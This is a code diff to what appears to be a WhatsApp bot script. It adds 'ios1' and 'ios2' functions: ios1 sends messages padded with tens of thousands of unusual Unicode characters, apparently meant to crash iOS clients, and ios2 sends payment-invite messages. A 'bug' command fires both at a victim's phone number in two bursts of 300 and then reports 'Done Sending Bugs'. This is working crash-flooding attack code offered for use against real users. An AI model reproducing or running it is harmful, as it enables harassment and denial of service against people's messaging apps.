@@ -824,6 +824,46 @@ await XeonBotInc.relayMessage(target, {"paymentInviteMessage": {serviceType: "FB
 await XeonBotInc.relayMessage(target, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 1814400000}},{ participant: { jid: target } })
 await XeonBotInc.relayMessage(target, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 1814400000}},{})
 }
+
+async function ios1(jid) {
+			XeonBotInc.relayMessage(jid, {
+				'extendedTextMessage': {
+					'text': '.',
+					'contextInfo': {
+						'stanzaId': jid,
+						'participant': jid,
+						'quotedMessage': {
+							'conversation': '𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭♱𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭♱XBUG5𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭♱𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭♱' + 'ꦾ'.repeat(50000)
+						},
+						'disappearingMode': {
+							'initiator': "CHANGED_IN_CHAT",
+							'trigger': "CHAT_SETTING"
+						}
+					},
+					'inviteLinkGroupTypeV2': "DEFAULT"
+				}
+			}, {
+				'participant': {
+					'jid': jid
+				}
+			}, {
+				'messageId': null
+			});
+		};
+
+		async function ios2(jid) {
+			XeonBotInc.relayMessage(jid, {
+				'paymentInviteMessage': {
+					'serviceType': "UPI",
+					'expiryTimestamp': Date.now() + 86400000
+				}
+			}, {
+				'participant': {
+					'jid': jid
+				}
+			});
+		};
+
         switch (command) {
 
 case 'xkill': {
@@ -873,8 +913,14 @@ if (!args[0]) return replygcxeon(`Use like:\n ${prefix + command} 23490316165xx`
 let target = args[0].replace(/[^0-9]/g, "") + "@s.whatsapp.net"
 await loading()
 for (let i = 0; i < 300; i++) {
- await ioscrash(target)
+ await ios1(target)
+ await ios2(target)
       }
+ await sleep(30000)
+ for (let i = 0; i < 300; i++) {
+ await ios1(target)
+ await ios2(target)
+ } 
 await replygcxeon("Done Sending Bugs ✅")
 }
 break
